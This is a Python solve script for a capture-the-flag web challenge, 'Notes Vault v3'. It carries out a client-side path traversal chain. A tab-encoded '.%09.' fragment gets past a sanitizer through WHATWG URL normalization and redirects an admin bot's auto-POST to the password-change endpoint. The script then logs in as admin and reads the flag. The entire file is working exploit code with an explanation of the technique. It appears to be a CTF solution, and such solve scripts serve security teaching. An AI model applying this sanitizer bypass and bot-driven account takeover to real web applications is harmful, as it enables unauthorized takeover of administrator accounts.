#!/usr/bin/env python3
"""
Automated solve for Notes Vault v3 (hard CSPT).

Chain:
  1. Register an attacker account.
  2. Report the notes page to the admin bot with a crafted fragment. The client
     reads `file` from the fragment and builds `new URL('/api/v1/notes/'+file)`
     after a naive client-side sanitizer that rejects "..", "\\" and encoded
     dots/slashes. WHATWG normalization strips ASCII TAB (0x09) *globally*, so
     `.%09.` becomes `..` only after the sanitizer has already passed it.
       file  = .%09./profile/password  ->  /api/v1/profile/password
     The same page auto-POSTs the `draft` value to that URL, so the admin's own
     session performs the password change.
  3. Log in as admin with the chosen password and read the flag.

Usage:  python3 solve.py [base_url]      (default http://127.0.0.1:3002)
"""
import http.cookiejar
import re
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3002").rstrip("/")
ATTACKER = "solver_" + secrets.token_hex(3)
NEW_ADMIN_PW = "owned_" + secrets.token_hex(4)


def opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post(op, path, data):
    req = urllib.request.Request(BASE + path, data=urllib.parse.urlencode(data).encode())
    return op.open(req)


def get(op, path):
    return op.open(BASE + path).read().decode()


def main():
    op = opener()
    post(op, "/signup", {"username": ATTACKER, "password": "pw"})
    print(f"[+] registered attacker: {ATTACKER}")

    fragment = (
        "file=.%09./profile/password&draft="
        + urllib.parse.quote("password=" + NEW_ADMIN_PW, safe="")
    )
    payload = BASE + "/#" + fragment
    post(op, "/report", {"url": payload})
    print(f"[+] reported payload (admin pw -> {NEW_ADMIN_PW}); waiting for bot...")

    for _ in range(12):
        time.sleep(2)
        admin = opener()
        try:
            post(admin, "/login", {"username": "admin", "password": NEW_ADMIN_PW})
        except urllib.error.HTTPError:
            continue
        body = get(admin, "/api/v1/admin/flag")
        m = re.search(r"SecurinetsENIT\{[^}]*\}", body)
        if m:
            print("[+] admin password reset via CSPT")
            print(f"[+] FLAG: {m.group(0)}")
            return 0

    print("[-] chain did not complete (bot slow or challenge hardened differently)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
